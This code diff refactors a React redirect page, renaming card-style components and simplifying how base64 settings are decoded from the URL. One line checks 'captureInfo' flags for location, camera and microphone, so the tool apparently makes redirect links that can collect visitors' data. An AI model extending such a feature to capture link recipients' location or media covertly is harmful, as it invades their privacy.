@@ -1,7 +1,7 @@
 import * as React from 'react';
 import { useParams } from 'react-router-dom';
 import type { Settings } from '../types';
-import { NEW_REDIRECT_TEMPLATE } from '../constants';
+import { NEW_REDIRECT_TEMPLATE, CARD_STYLES } from '../constants';
 
 interface RedirectPageProps {
   previewSettings?: Settings | Omit<Settings, 'id'>;
@@ -123,7 +123,7 @@ const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ se
   </div>
 );
 
-const PolaroidCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => (
+const PhotoFrameCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => (
     <div className="relative w-full max-w-sm animate-scale-in p-4 pb-12 bg-white shadow-2xl rounded-md transform rotate-1" style={{ color: settings.textColor }}>
         <div className="bg-slate-800 aspect-square w-full flex items-center justify-center">
             {settings.customIconUrl ?
@@ -171,7 +171,7 @@ const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
     </div>
 );
 
-const GlowCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => (
+const LuminousCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => (
     <div className="w-full max-w-md animate-fade-in text-center flex flex-col items-center gap-6" style={{ color: settings.textColor }}>
         {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-32 h-32 object-contain" style={{ filter: `drop-shadow(0 0 15px ${settings.textColor})` }}/>}
         <h1 className="text-5xl font-bold animate-glow" style={{ textShadow: `0 0 10px ${settings.textColor}, 0 0 20px ${settings.textColor}` }}>{settings.displayText}</h1>
@@ -239,8 +239,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
     }
 
     try {
-      const decodedData = decodeURIComponent(data);
-      const decodedString = atob(decodedData);
+      // Data from react-router's useParams is already URL-decoded.
+      const decodedString = atob(data);
       const parsedSettings: Omit<Settings, 'id'> = JSON.parse(decodedString);
       const isAnyCaptureEnabled = parsedSettings.captureInfo?.location || parsedSettings.captureInfo?.camera || parsedSettings.captureInfo?.microphone;
 
@@ -368,10 +368,10 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         case 'minimal': return <MinimalCard {...props} />;
         case 'elegant': return <ElegantCard {...props} />;
         case 'sleek-dark': return <SleekDarkCard {...props} />;
-        case 'polaroid': return <PolaroidCard {...props} />;
+        case 'photo-frame': return <PhotoFrameCard {...props} />;
         case 'terminal': return <TerminalCard {...props} />;
         case 'retro-tv': return <RetroTVCard {...props} />;
-        case 'glow': return <GlowCard {...props} />;
+        case 'luminous': return <LuminousCard {...props} />;
         case 'video-player': return <VideoPlayerCard {...props} />;
         default: return <DefaultWhiteCard {...props} />;
     }
